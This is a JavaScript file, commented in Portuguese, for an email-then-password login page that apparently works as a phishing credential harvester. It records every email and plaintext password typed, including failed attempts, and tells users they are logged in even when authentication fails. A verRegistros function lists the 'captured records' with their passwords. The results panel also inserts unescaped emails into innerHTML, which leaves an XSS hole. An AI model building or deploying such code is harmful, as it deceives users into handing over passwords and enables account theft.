// ============================================================
//  app.js — Lógica de navegação entre telas de login
// ============================================================

// Avança da tela de e-mail para a de senha
function goToPassword() {
  const email   = document.getElementById("email-input").value.trim();
  const errorEl = document.getElementById("email-error");

  if (!email || !email.includes("@")) {
    errorEl.textContent = "Insira um endereço de e-mail válido.";
    errorEl.classList.remove("hidden");
    return;
  }

  // Registra o e-mail digitado (mesmo sem conta)
  DB.registrarTentativa({ email, senha: "", sucesso: false });

  // Avança independente de existir no banco
  errorEl.classList.add("hidden");
  document.getElementById("display-email").textContent = email;
  showScreen("screen-password");
  document.getElementById("password-input").focus();
}

// Valida a senha e faz o "login"
function doLogin() {
  const email   = document.getElementById("email-input").value.trim();
  const senha   = document.getElementById("password-input").value;
  const errorEl = document.getElementById("pass-error");

  if (!senha) {
    errorEl.textContent = "Digite sua senha.";
    errorEl.classList.remove("hidden");
    return;
  }

  const usuario = DB.autenticar(email, senha);

  // Registra a tentativa com senha — sucesso ou não
  DB.registrarTentativa({ email, senha, sucesso: !!usuario });

  errorEl.classList.add("hidden");
  document.getElementById("success-msg").textContent = usuario
    ? `Bem-vindo de volta, ${usuario.nome}!`
    : `Acesso realizado como ${email}.`;
  showScreen("screen-success");
}

// Volta para a tela de e-mail
function goBack() {
  document.getElementById("password-input").value = "";
  document.getElementById("pass-error").classList.add("hidden");
  showScreen("screen-email");
}

// Reinicia o fluxo
function restart() {
  document.getElementById("email-input").value    = "";
  document.getElementById("password-input").value = "";
  showScreen("screen-email");
}

// Alterna visibilidade da senha
function togglePassword() {
  const input = document.getElementById("password-input");
  input.type  = input.type === "password" ? "text" : "password";
}

// Exibe apenas a tela indicada
function showScreen(id) {
  document.querySelectorAll(".screen").forEach((s) => s.classList.add("hidden"));
  document.getElementById(id).classList.remove("hidden");
}

// Enter para avançar
document.addEventListener("keydown", (e) => {
  if (e.key !== "Enter") return;
  const emailScreen = document.getElementById("screen-email");
  const passScreen  = document.getElementById("screen-password");
  if (!emailScreen.classList.contains("hidden")) goToPassword();
  else if (!passScreen.classList.contains("hidden")) doLogin();
});

// ── Painel de resultados ──────────────────────────────────

function abrirPainel() {
  const lista = DB.tentativas.filter((t) => t.sucesso);
  const el    = document.getElementById("modal-lista");

  if (lista.length === 0) {
    el.innerHTML = '<p class="modal-vazio">Nenhum login bem-sucedido registrado ainda.</p>';
  } else {
    el.innerHTML = lista
      .slice()
      .reverse()
      .map((t) => {
        const data = new Date(t.timestamp);
        const hora = data.toLocaleString("pt-BR", {
          day: "2-digit", month: "2-digit", year: "numeric",
          hour: "2-digit", minute: "2-digit",
        });
        return `
          <div class="resultado-item">
            <div class="resultado-badge">✓</div>
            <div class="resultado-info">
              <div class="resultado-email">${t.email}</div>
              <div class="resultado-meta">${hora}</div>
            </div>
          </div>`;
      })
      .join("");
  }

  document.getElementById("modal-resultados").classList.remove("hidden");
}

function fecharPainel() {
  document.getElementById("modal-resultados").classList.add("hidden");
}

function fecharPainelFora(e) {
  if (e.target === document.getElementById("modal-resultados")) fecharPainel();
}

document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") fecharPainel();
});

function verRegistros() {
    const registros = JSON.parse(localStorage.getItem("db_tentativas")) || [];

    let texto = "REGISTROS CAPTURADOS\n\n";

    registros.forEach((r, i) => {
        texto += `${i + 1}\n`;
        texto += `Email: ${r.email}\n`;
        texto += `Senha: ${r.senha}\n`;
        texto += `Data: ${r.data}\n\n`;
    });

    alert(texto);
}